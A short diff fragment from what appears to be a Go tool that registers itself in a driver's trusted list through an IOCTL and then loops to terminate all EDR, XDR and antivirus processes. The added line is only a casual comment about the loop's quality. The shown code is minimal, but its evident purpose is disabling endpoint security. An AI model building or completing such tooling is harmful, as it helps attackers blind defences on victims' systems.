@@ -274,6 +274,7 @@ func main() {
 	fmt.Printf("Process registered in the trusted list %X !!\n", IOCTL_REGISTER_PROCESS)
 
 	fmt.Println("Terminating ALL EDR/XDR/AVs...")
+	// bad code right here, its useless but ye i wont upd you can simply do it yourself, beginner can do it!
 	for {
 		if count := edrcheck(windows.Handle(hDevice)); count == 0 {
 			time.Sleep(1 * time.Second)
